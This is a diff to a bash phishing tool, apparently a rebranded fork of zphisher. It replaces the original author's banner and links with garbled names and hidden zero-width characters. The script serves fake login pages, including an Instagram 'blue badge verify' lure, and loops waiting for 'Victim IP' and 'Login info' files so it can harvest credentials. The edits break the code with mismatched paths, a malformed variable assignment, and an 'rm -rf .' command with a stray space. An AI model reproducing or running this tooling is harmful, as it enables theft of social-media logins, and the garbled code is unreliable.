@@ -27,19 +27,19 @@ fi
 
 }
 
-banner() {
+banner(){🇲​​​​​🇮​​​​​🇸​​​​​🇸​​​​​ 🇨​​​​​🇷​​​​​🇪​​​​​🇦​​​​​🇹​​​​​🇮​​​​​🇴​​​​​🇳​​​​​ 🇦​​​​​🇾​​​​​🇪​​​​​🇸​​​​​🇭​​​​​🇦​​​​​ 🇰​​​​​🇦​​​​​🇸​​​​​🇭​​​​​🇲​​​​​🇮​​​​​🇷​​​​​🇮​​​​​
 
 clear
 printf "      \e[33;1m ______      _     _     _               \e[0m\n"
-printf "      \e[33;1m|___  /     | |   (_)   | |              \e[0m\n"
-printf "      \e[33;1m   / / _ __ | |__  _ ___| |__   ___ _ __ \e[0m\n"
-printf "      \e[32;1m  / /\e[33;1m | '_ \| '_ \| / __| '_ \ / _ \ '__|\e[0m\n"
-printf "      \e[32;1m / /__| |_) | | | | \__ \ | | |  __/ |   \e[0m\n"
+printf "      \e[33;1m|___miss/  creation   |ayesha Khan |   (_)   | |              \e[0m\n"
+printf "      \e[33;1m  its ashu / / _ __ | |__  _ ___| |__   ___ _ __ \e[0m\n"
+printf "      \e[32;1m  / /\e[33;1m | 'shadow_ \| '_ \| / __| '_ \ / _ \ '__|\e[0m\n"
+printf "      \e[32;1m / /__| |_) | | | | \__ \ |hacker | |  __/ |   \e[0m\n"
 printf "      \e[32;1m/_____| .__/|_| |_|_|___/_| |_|\___|_|   \e[0m\n"
 printf "      \e[33;1m      | |                                \e[0m\n"
-printf "      \e[33;1m      |_|           \e[1;97m    Version 2.1 Beta      \e[0m\n"
+printf "      \e[33;1m      |_|       sexy Quee     \e[1;97m    Version 2.1 Beta      \e[0m\n"
 printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.rayat)\e[0m\n"
+printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by misscreation/Shadow Hacker combination(hackers creation)\e[0m\n"
 printf "\n"
 
 }
@@ -271,7 +271,7 @@ elif [[ $menu_option == 99 ]]; then
 about
 elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
 printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
+printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/misscreation for more\e[0m\n"
 printf "\e[0m\n"
 exit 1
 
@@ -341,7 +341,7 @@ elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
 website="ig_verify"
 mask='blue-badge-verify-for-instagram-free'
 tunnel_menu
-
+mask= 'blue-badge-verify-for-facebook-free'
 else
 printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
 sleep 1
@@ -414,11 +414,11 @@ about() {
 clear
 banner
 printf "\e[0m\n"
-printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m TAHMID RAYAT \e[0m\e[91m[\e[0m\e[93m HTR-TECH \e[0m\e[91m]\e[0m\n"
+printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m ayesha-malik abid Hussain EthicalHacker s friend \e[0m\e[91m[\e[0m\e[93m HTR-TECH \e[0m\e[91m]\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/htr-tech\e[0m\n"
+printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/shadow/creation\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  Social \e[0m\e[91m     : \e[0m\e[96mhttps://linktr.ee/tahmid.rayat\e[0m\n"
+printf "\e[0m\e[92m  Social \e[0m\e[91m     : \e[0m\e[96mhttps://Facebook/hackercracker34080\e[0m\n"
 printf "\e[0m\n"
 printf "\e[0m\e[92m  Version \e[0m\e[91m    : \e[0m\e[93m2.1 Beta\e[0m\n"
 printf "\e[0m\n"
@@ -439,7 +439,7 @@ menu
 elif [[ $about_option == 99 ]]; then
 sleep 1
 printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
+printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/misscreation/Shadow Hacker for more\e[0m\n"
 printf "\e[0m\n"
 exit 1
 
@@ -453,15 +453,15 @@ fi
 
 tunnel_menu() {
 
-if [[ -d .htr/www ]]; then
-rm -rf .htr/www
-mkdir .htr/www
+if [[ -d .cr/www ]]; then
+rm -rf . misscreation/www
+mkdir .shadow hacker/www
 else
-mkdir .htr/www
+mkdir .sexy hackers/www
 fi
 
 cp -rf .Modules/$website/* .htr/www
-cp -f .Modules/ip.php .htr/www/
+cp -f .Modules/ip.php . bestis/www/
 
 def_tunnel_menu="2"
 banner
@@ -597,18 +597,18 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login In
 printf "\n"
 while [ true ]; do
 
-if [[ -e ".htr/www/ip.txt" ]]; then
+if [[ -e ".ayesha/www/ip.txt" ]]; then
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found ! \e[0m\n"
 grab_ip
-rm -rf .htr/www/ip.txt
+rm -rf . Ayesha/www/ip.txt
 fi
 sleep 0.75
-if [[ -e ".htr/www/usernames.txt" ]]; then
+if [[ -e ".ayesha/www/usernames.txt" ]]; then
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !! \e[0m\n"
 grab_creds
-rm -rf .htr/www/usernames.txt
+rm -rf .ayesha/www/usernames.txt
 fi
 sleep 0.75
 done 
